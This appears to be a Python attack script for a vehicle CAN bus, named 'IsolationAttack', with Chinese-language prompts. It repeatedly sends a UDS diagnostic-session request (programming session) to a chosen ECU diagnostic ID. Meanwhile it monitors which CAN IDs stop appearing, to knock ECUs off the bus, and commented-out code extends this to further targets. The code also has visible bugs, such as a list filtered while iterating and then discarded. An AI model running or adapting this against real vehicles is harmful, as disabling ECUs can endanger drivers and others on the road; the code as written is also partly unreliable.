from frame import Frame
from mydevice import MyDevice
from multiprocessing import Process
import time


class IsolationAttack(MyDevice):
    def __init__(self):
        super(IsolationAttack, self).__init__()
        self.raw_id = []
        self.send_flag = False
        self.isolation_id = []

    def raw_collection(self, data=None, mode=0, i=1000, j=10):
        if data is None:
            ex = Exception("no data")
            raise ex
        if mode == 0:
            while i != 0:
                rx = self.receive()
                if hex(rx.ID) not in data:
                    data.append(hex(rx.ID))
                i -= 1

        elif mode == 1:
            time0 = time.time()
            while time.time() - time0 <= j:
                rx = self.receive()
                if hex(rx.ID) not in data:
                    data.append(hex(rx.ID))

    def initial_id(self):
        self.raw_collection(data=self.raw_id)
        self.raw_id.sort()
        print(self.raw_id)
        print("initial id ending")

    def transmit_process(self, diagnosis_id):
        tx = Frame(diagnosis_id, [0x02, 0x10, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00])
        while True:
            time.sleep(1)
            self.transmit(tx_frame=tx)

    def drop_attack(self, ):
        while True:
            time.sleep(1)
            print("id collection start")
            self.raw_collection(data=self.isolation_id, mode=m, i=number_frame, j=number_time)
            self.remove_diagnosis()
            self.isolation_id.sort()
            print(self.isolation_id)
            print("diagnosis session id collection end")

    def remove_diagnosis(self):
        queue = [int(i, 16) for i in self.isolation_id]
        for i in queue:
            if 0x7ff >= i >= 0x700:
                queue.remove(i)
        print(queue)

    def test(self, target_id=0x720, ):
        p1 = Process(target=self.transmit_process, args=(target_id, ))
        p2 = Process(target=self.drop_attack, args=())
        # p3 = Process(target=self.transmit_process, args=(0x730,))
        # p4 = Process(target=self.drop_attack)
        # p5 = Process(target=self.transmit_process, args=(0x760,))
        # p6 = Process(target=self.drop_attack)
        # p7 = Process(target=self.transmit_process, args=(0x7e0,))
        # p8 = Process(target=self.drop_attack)
        p1.start()
        p2.start()
        # p3.start()
        # p4.start()
        # p5.start()
        # p6.start()
        # p7.start()
        # p8.start()


if __name__ == "__main__":
    attack = IsolationAttack()
    print("请输入选择的波特率:\r\n"
          "125 or 500\r\n")
    baud_rate = int(input())
    attack.start(baud_rate)
    try:
        number_frame = 10000
        number_time = 10
        print('请选择收集数据的方式:\r\nnumber or time\r\n')
        while True:
            m = input()
            if m == 'number':
                print('请输入预计收集数据帧数量:\r\n')
                number_frame = int(input())
                m = 0
                break
            elif m == 'time':
                print('请输入收集数据时间:\r\n seconds\r\n')
                number_time = int(input())
                m = 1
                break
            else:
                print("Input type ERROR")
        # attack.raw_collection(data=)
        print('请输入诊断ID:\r\n'
              '0x---\r\n')
        diagnosis__id = int(input(), 16)
        attack.test(target_id=diagnosis__id)
    except Exception as result:
        print("未知错误：%s" % result)
    finally:
        attack.stop()
